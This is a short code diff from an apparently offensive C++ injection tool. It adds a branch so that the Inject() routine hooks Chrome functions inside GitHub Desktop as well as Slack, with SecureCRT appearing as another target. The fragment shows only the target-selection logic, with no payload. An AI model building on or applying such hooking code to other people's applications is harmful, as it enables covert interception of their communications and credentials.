@@ -204,7 +204,16 @@ void Inject()
 		{
 			// Hook Chrome functions
 
-			HookSlack();
+			HookChrome("slack.exe");
+		}
+
+		// GithubDesktop.exe
+
+		else if (Utils::ToLower(vDlls[i].szModule).compare("githubdesktop.exe") == 0)
+		{
+			// Hook Chrome functions
+
+			HookChrome("githubdesktop.exe");
 		}
 
 		// SecureCRT
